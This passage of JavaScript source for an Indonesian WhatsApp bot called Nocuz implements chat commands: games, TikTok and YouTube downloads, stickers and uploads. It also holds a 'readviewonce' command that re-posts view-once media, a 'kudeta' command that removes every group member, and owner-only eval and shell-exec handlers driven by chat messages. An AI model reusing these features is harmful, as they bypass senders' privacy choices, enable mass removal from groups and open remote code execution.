                delete Nocuz.tebakbendera[m.chat];
            }, 120 * 1000)
        ];
    } catch (error) {
        console.error("Error mengambil data:", error);
        throw "❌ Gagal mengambil data tebak bendera.";
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tebakgambar": {
    Nocuz.tebakgambar ??= {};
    if (Nocuz.tebakgambar[m.chat]) {
        return Nocuz.sendMessage(m.chat, { 
            text: "❗ Masih ada soal yang belum terjawab" 
        }, { quoted: Nocuz.tebakgambar[m.chat][1] });
    }

    try {
        let response = await fetch("https://raw.githubusercontent.com/alands-offc/database/refs/heads/master/games/tebakgambar.json");
        let data = await response.json();
        let json = pickRandom(data);

        Nocuz.tebakgambar[m.chat] = [
            json,
            await Nocuz.sendMessage(m.chat, {
                image: { url: json.img },
                caption: `🖼️ Tebak gambar ini?\n⏳ Waktu habis: 180 detik dari sekarang\nKetik *menyerah* untuk menyerah\nBalas pesan ini untuk menjawab`
            }, { quoted: m }),
            setTimeout(async () => {
                await Nocuz.sendMessage(m.chat, {
                    text: `⏰ Waktu habis!\nJawabannya: *${json.jawaban.toLowerCase()}*`
                }, { quoted: Nocuz.tebakgambar[m.chat][1] });
                delete Nocuz.tebakgambar[m.chat];
            }, 180 * 1000)
        ];
    } catch (error) {
        console.error("Error mengambil data:", error);
        throw "❌ Gagal mengambil data tebak gambar.";
    }
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "yts": {
    if (!text) return m.reply(example('upin ipin'))
    await Nocuz.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    let ytsSearch = await yts(text)
    const anuan = ytsSearch.all
    let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
    for (let res of anuan) {
        teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
    }
    await m.reply(teks)
    await Nocuz.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tt": case "tiktok": {
    if (!text) return m.reply(example("url"))
    if (!text.startsWith("https://")) return m.reply(example("url"))

    try {
        await Nocuz.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })
        let result = await tiktokDl(text)
        if (!result.status) return m.reply("❌ Gagal mengambil data TikTok!")

        if (result.duration == 0 || result.duration == "0 Seconds") {
            let araara = []
            let urutan = 0
            for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia(
                    { image: { url: `${a.url}` } },
                    { upload: Nocuz.waUploadToServer }
                )
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `Foto Slide Ke *${++urutan}*`,
                        hasMediaAttachment: true,
                        ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    })
                })
            }

            const msgii = await generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessageV2Extension: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.fromObject({
                                    text: "*Sukses*"
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: araara
                                })
                            })
                        }
                    }
                },
                { userJid: m.sender, quoted: m }
            )

            await Nocuz.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
        } else {
            let urlVid = result.data.find(
                e => e.type == "nowatermark_hd" || e.type == "nowatermark"
            )
            if (!urlVid) return m.reply("❌ Video tidak ditemukan!")
            await Nocuz.sendMessage(
                m.chat,
                { video: { url: urlVid.url }, mimetype: 'video/mp4', caption: `*Sukses di Download*` },
                { quoted: m }
            )
        }
    } catch (e) {
        console.error("Error TikTok:", e)
        await m.reply("❌ Terjadi kesalahan saat memproses link TikTok.\nCoba lagi nanti!")
    }

    await Nocuz.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "shortlink": case "shorturl": {
    if (!text) return m.reply(example("https://example.com"))
    if (!isUrl(text)) return m.reply(example("https://example.com"))
    
    try {
        let res = await axios.get(
            'https://tinyurl.com/api-create.php?url=' + encodeURIComponent(text)
        )
        let link = `
*🔗 Shortlink by tinyurl.com*
${res.data}
        `
        return m.reply(link)
    } catch (e) {
        console.error(e)
        return m.reply("❌ Gagal membuat shortlink, coba lagi nanti.")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "cekidch": case "idch": {
    if (!text) return Reply(example("https://whatsapp.com/channel/XXXXXXX"))
    let match = text.match(/https?:\/\/whatsapp\.com\/channel\/([0-9A-Za-z]+)/)
    if (!match) return m.reply("❌ Link channel tidak valid!")
    
    let channelId = match[1]
    
    try {
        let res = await Nocuz.newsletterMetadata("invite", channelId)
        let teks = `
[ 𖤍 ] *INFORMASI SALURAN*

*ID:* ${res.id}
*Nama:* ${res.name}
*Total Pengikut:* ${res.subscribers}
*Status:* ${res.state}
*Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Tidak"}
        `
        return Reply(teks)
    } catch (e) {
        console.error(e)
        return m.reply("❌ Gagal mengambil data channel, coba lagi nanti!")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "brat": {
    if (!text && !m.quoted) 
        return m.reply("⚠️ Masukkan teks atau reply teks yang mau dijadikan brat sticker.")

    const bratText = text || m.quoted.text
    try {
        const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(bratText)}`
        const res = await fetch(apiUrl)

        if (!res.ok) 
            return m.reply(`❌ Gagal request API (status ${res.status})`)

        const buffer = Buffer.from(await res.arrayBuffer())
        await Nocuz.sendMessage(m.chat, { sticker: buffer }, { quoted: m })
    } catch (err) {
        console.error(err)
        m.reply("❌ Terjadi kesalahan saat membuat brat sticker.")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "bratvid": {
    if (!text) return Reply(example("hallo apa kabar"));
    
    try {
        await Nocuz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
        const response = await axios.get(url, { responseType: "arraybuffer" });

        // Kirim sebagai video sticker
        await Nocuz.sendMessage(
            m.chat, 
            { 
                video: Buffer.from(response.data),
                mimetype: 'video/mp4',
                caption: "Brat Video By Nocuz🎬"
            }, 
            { quoted: lol }
        );

        await Nocuz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (err) {
        console.error("Error:", err);
        Reply("❌ Gagal membuat brat video. Coba lagi nanti.");
    }
}
break; 
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "qc": {
    if (!text) return m.reply(example('teksnya'))

    let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
    var ppuser
    try {
        ppuser = await Nocuz.profilePictureUrl(m.sender, 'image')
    } catch (err) {
        ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
    }

    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#000000",
        "width": 812,
        "height": 968,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": m.pushName,
                    "photo": {
                        "url": ppuser
                    }
                },
                "text": text,
                "replyMessage": {}
            }
        ]
    };

    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: { 'Content-Type': 'application/json' }
    }).then(async (res) => {
        const buffer = Buffer.from(res.data.result.image, 'base64')
        let tempnya = "./library/database/sampah/" + m.sender + ".png"

        await fs.writeFile(tempnya, buffer, async (err) => {
            if (err) return m.reply("Error")

            await Nocuz.sendAsSticker(m.chat, tempnya, m, { packname: global.packname })
            await fs.unlinkSync(`${tempnya}`)
        })
    })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ipqc": case "iqc": {
    if (!text) 
        return m.reply(`Masukkan teks!\nContoh: ${prefix + command} nocuz version 6`)

    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?messageText=${encodeURIComponent(text)}&carrierName=INDOSAT&batteryPercentage=78`

    try {
        await Nocuz.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: "✅ *Done generate ipqc.*"
        }, { quoted: m })
    } catch (err) {
        console.error("ipqc error:", err)
        m.reply("❌ Gagal generate ipqc.")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "s": case "sticker": case "stiker": {
    if (!/image|video/gi.test(mime)) 
        return m.reply(example("dengan kirim media"))

    if (/video/gi.test(mime) && qmsg.seconds > 15) 
        return m.reply("Durasi video maksimal 15 detik!")

    var image = await Nocuz.downloadAndSaveMediaMessage(qmsg)
    await Nocuz.sendAsSticker(m.chat, image, m, { packname: global.packname })
    await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "swm": case "stickerwm": case "stikerwm": case "wm": {
    if (!text) 
        return m.reply(example("namamu dengan kirim media"))

    if (!/image|video/gi.test(mime)) 
        return m.reply(example("namamu dengan kirim media"))

    if (/video/gi.test(mime) && qmsg.seconds > 15) 
        return m.reply("Durasi video maksimal 15 detik!")

    var image = await Nocuz.downloadAndSaveMediaMessage(qmsg)
    await Nocuz.sendAsSticker(m.chat, image, m, { packname: text })
    await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "rvo": case "readviewonce": {
    if (!m.quoted) 
        return m.reply(example("dengan reply pesan 1× lihat"))

    let msg = m.quoted.message
    let type = Object.keys(msg)[0]

    if (!msg[type].viewOnce) 
        return m.reply("Pesan itu bukan viewonce!")

    let media = await downloadContentFromMessage(
        msg[type], 
        type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    if (/video/.test(type)) {
        return Nocuz.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" }, { quoted: m })
    } else if (/image/.test(type)) {
        return Nocuz.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" }, { quoted: m })
    } else if (/audio/.test(type)) {
        return Nocuz.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tourl": {
    if (!/image/.test(mime)) 
        return m.reply(example("dengan kirim/reply foto"))

    let media = await Nocuz.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('pixhost.to')

    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'nocuz.png')
    let teks = directLink.toString()

    await Nocuz.sendMessage(m.chat, { text: teks }, { quoted: m })
    await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tourl2": {
    if (!/image/.test(mime)) 
        return m.reply(example("dengan kirim/reply foto"))

    let media = await Nocuz.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('postimages.org')

    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'nocuz.png')
    let teks = directLink.toString()

    await Nocuz.sendMessage(m.chat, { text: teks }, { quoted: m })
    await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "hd":
case "remini": 
case "buathd": {
    if (!quoted) return Reply("📷 Reply gambarnya!");
    if (!/image/.test(mime)) return Reply(`Kirim/Reply foto dengan caption ${prefix + command}`);
    
    await Nocuz.sendMessage(m.chat, { react: { text: "🎭", key: m.key } });
    
    try {
        // Menggunakan fungsi remini yang sudah ada di library/scraper
        let media = await quoted.download();
        
        // Enhance gambar
        const enhanced = await remini(media, "enhance");
        
        await Nocuz.sendMessage(m.chat, { 
            image: enhanced, 
            caption: "_Sukses Membuat HD Enhance✅_" 
        }, { quoted: m });
        
        await Nocuz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        
    } catch (error) {
        console.error(error);
        Reply('❌ Error processing image');
        await Nocuz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "toaudio": case "tovn": {
    if (!/video|mp4/.test(mime)) 
        return m.reply(example("dengan reply/kirim vidio"))

    const vid = await Nocuz.downloadAndSaveMediaMessage(qmsg)
    const result = await toAudio(fs.readFileSync(vid), "mp4")

    await Nocuz.sendMessage(
        m.chat, 
        { 
            audio: result, 
            mimetype: "audio/mpeg", 
            ptt: /tovn/.test(command) ? true : false 
        }, 
        { quoted: m }
    )

    await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ping": case "uptime": {
    let timestamp = speed()
    let latensi = speed() - timestamp
    let tio = await nou.os.oos()
    var tot = await nou.drive.info()

    let respon = `
[ 𖤍 ] *INFORMASI SERVER*

*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}
*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
    await Reply(respon)
}
break

// -----------------------------[ SECRET CASE ]------------------------------
case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
Reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "bantaigrub": case "kdt": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return Reply("Grup Ini Sudah Tidak Ada Member!")
await Reply("Kudeta Grup By Nocuz☠️")
for (let i of memberFilter) {
await Nocuz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await Reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break


///  ██████████[ CEK ERROR ]█████████████
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}

///  ██████████[ HANDLER GAME ]█████████████
        if (!isCmd) {
            if (Nocuz.tebakgambar?.[m.chat]) {
                const game = Nocuz.tebakgambar[m.chat];
                const answer = game[0].jawaban.toLowerCase();
                const userAnswer = budy.toLowerCase().trim();
                
                if (userAnswer === "menyerah" || userAnswer === answer) {
                    if (userAnswer === "menyerah") {
                        await Reply(`😔 Menyerah!\nJawaban: *${answer}*`);
                    } else {
                        await Reply(`🎉 Benar! Jawaban: *${answer}*`);
                        clearTimeout(game[2]);
                    }
                    delete Nocuz.tebakgambar[m.chat];
                }
            }
        }
        
    } catch (err) {
        console.log(require("util").format(err));
    }
};


///  ██████████[ END ]█████████████
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});